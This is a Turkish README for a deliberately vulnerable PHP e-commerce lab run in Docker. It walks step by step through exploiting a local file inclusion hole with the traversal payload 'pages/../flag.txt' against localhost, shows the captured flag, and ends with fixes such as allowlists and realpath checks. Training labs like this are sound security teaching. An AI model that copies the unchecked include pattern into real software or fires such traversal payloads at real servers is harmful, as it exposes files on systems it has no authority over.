# AltayStore | LFI Lab (Egitim)

Koyu lacivert + kirmizi vurgu temali e-ticaret arayuzu ile **bilerek zayif** bir `include` akisi icerir. Yalnizca **izole lab / Docker** ortaminda kullanin.

## Kurulum

```bash
docker build -t altaystore-lfi-lab .
docker run --rm -p 8080:80 altaystore-lfi-lab
```

Tarayici: `http://localhost:8080`

## Normal sayfa URL’leri

- `?page=pages/home.php`
- `?page=pages/products.php`
- `?page=pages/categories.php`
- `?page=pages/cart.php`
- `?page=pages/account.php`

## Zafiyet ozeti (`index.php`)

- `page` GET parametresi dogrudan `include $page;` ile yuklenir.
- Kontrol: deger **mutlaka** `pages/` ile baslamali (`strpos($page, 'pages/') === 0`).
- Bu kontrol, `pages/` sonrasinda `../` kullanimini engellemez; yani **directory traversal + LFI** mumkun.

Flag dosyasi Docker imajinda web kokune kopyalanir: `flag.txt` (proje kokunde).

---

## LFI nasil somurulur? (adim adim — sadece bu lab)

**Adim 1 — Ortami hazirla**  
Docker ile uygulamayi calistir, tarayicida ana sayfayi ac.

**Adim 2 — Parametreyi fark et**  
Kenar cubugundaki linkler `?page=pages/...` kullanir. Sunucu bu degeri `include` eder.

**Adim 3 — Kaynak kodu oku**  
`index.php` icinde `strpos(..., 'pages/')` ve `include $page` satirlarini bul. Filtrenin sadece **on ek** oldugunu not et.

**Adim 4 — Traversal dusun**  
`pages/` ile baslayip sonra ust dizinlere cikmak icin `../` zinciri kullanilabilir. Hedef: web kokundeki `flag.txt`.

**Adim 5 — Istegi gonder**  
Asagidaki gibi bir `page` degeri dene (tek satir, URL kodlamasi gerekmez):

`?page=pages/../flag.txt`

Bu yol, `pages/` dizinine girip bir ust dizine cikip `flag.txt` dosyasina ulasir; PHP dosyayi `include` ettiginde icerik (flag metni) yanit govdesinde gorunur.

**Adim 6 — Sonucu dogrula**  
Sayfa govdesinde `AltaySec{...}` ile baslayan flag satirini gormelisin.

**Adim 7 — Alternatif derinlik**  
Dosya yapisi farkli bir imajda calisiyorsan, gerektigi kadar `../` ekleyerek web kokune ulasmayi dene (ornek mantik: `pages/../../flag.txt`).

---

## Docker ile somurme denemesi (bu repoda calistirildi)

Asagidaki adimlar gercekten uygulanip sonuc dogrulandi; amac sadece **kendi lab konteynerinde** ayni akisi tekrar etmek.

**D1 — Imaji uret**  
Proje kokunde:

```bash
docker build -t altaystore-lfi-lab .
```

**D2 — Konteyneri calistir**  
8080 baska bir serviste doluysa baska bir host portu sec (ornekte `8085`):

```bash
docker run -d --name altaystore-lfi-verify -p 8085:80 altaystore-lfi-lab
```

Tek seferlik deneme icin `--rm` kullanmak istersen:

```bash
docker run --rm -p 8080:80 altaystore-lfi-lab
```

**D3 — LFI istegini gonder**  
Web kokundeki `flag.txt` icin (filtre `pages/` ile basladigi icin bu yol gecer):

```bash
curl -s "http://localhost:8085/?page=pages/../flag.txt"
```

Windows PowerShell’de ayni istek:

```powershell
curl.exe -s "http://localhost:8085/?page=pages/../flag.txt"
```

**D4 — Yaniti kontrol et**  
Donen HTML govdesinde, layout icinde duz metin olarak flag satiri gorunur. Bu repoda dogrulanan ornek icerik:

`AltaySec{lfi_lab_flag_okuma}`

Istersen sadece flag satirini suz:

```powershell
curl.exe -s "http://localhost:8085/?page=pages/../flag.txt" | Select-String "AltaySec"
```

**D5 — Tarayici ile ayni sey**  
Adres cubuguna su URL’yi yapistir (portu kendi `docker run` satirina gore degistir):

`http://localhost:8085/?page=pages/../flag.txt`

**D6 — Temizlik (opsiyonel)**  
Arka planda `-d` ile calistirdiysan:

```bash
docker rm -f altaystore-lfi-verify
```

---

## Uyari

Bu kod **bilerek guvensizdir**. Uretimde veya internete acik sunucuda calistirma.

## Savunma (LFI nasil kapatilir?)

- Kullanici girdisini **asla** dogrudan `include` etme.
- **Allowlist:** sadece `home`, `products` gibi anahtarlar; sunucu tarafinda sabit dosya yolu eslemesi.
- Ek olarak `realpath()` + belirlenen kok dizin altinda kalma kontrolu kullanilabilir.

Guvenli ornek icin bu repoda allowlist’li `index.php` surumune geri donulebilir veya ayri bir `secure/` branch kullanilabilir.
